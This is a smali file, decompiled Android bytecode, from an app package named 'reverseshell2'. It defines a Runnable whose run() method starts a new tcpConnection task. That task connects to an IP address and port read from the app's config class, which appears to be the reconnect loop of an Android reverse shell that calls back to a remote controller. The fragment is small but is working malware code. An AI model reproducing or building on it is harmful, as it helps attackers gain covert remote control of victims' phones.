.class Lcom/example/reverseshell2/tcpConnection$5;
.super Ljava/lang/Object;
.source "tcpConnection.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/tcpConnection;->doInBackground([Ljava/lang/String;)Ljava/lang/Void;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/example/reverseshell2/tcpConnection;


# direct methods
.method constructor <init>(Lcom/example/reverseshell2/tcpConnection;)V
    .locals 0
    .param p1, "this$0"    # Lcom/example/reverseshell2/tcpConnection;

    .line 285
    iput-object p1, p0, Lcom/example/reverseshell2/tcpConnection$5;->this$0:Lcom/example/reverseshell2/tcpConnection;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 288
    new-instance v0, Lcom/example/reverseshell2/tcpConnection;

    iget-object v1, p0, Lcom/example/reverseshell2/tcpConnection$5;->this$0:Lcom/example/reverseshell2/tcpConnection;

    iget-object v1, v1, Lcom/example/reverseshell2/tcpConnection;->activity:Landroid/app/Activity;

    iget-object v2, p0, Lcom/example/reverseshell2/tcpConnection$5;->this$0:Lcom/example/reverseshell2/tcpConnection;

    iget-object v2, v2, Lcom/example/reverseshell2/tcpConnection;->context:Landroid/content/Context;

    invoke-direct {v0, v1, v2}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v1, v1, [Ljava/lang/String;

    sget-object v2, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v2, v1, v3

    sget-object v2, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;

    const/4 v3, 0x1

    aput-object v2, v1, v3

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 289
    return-void
.end method
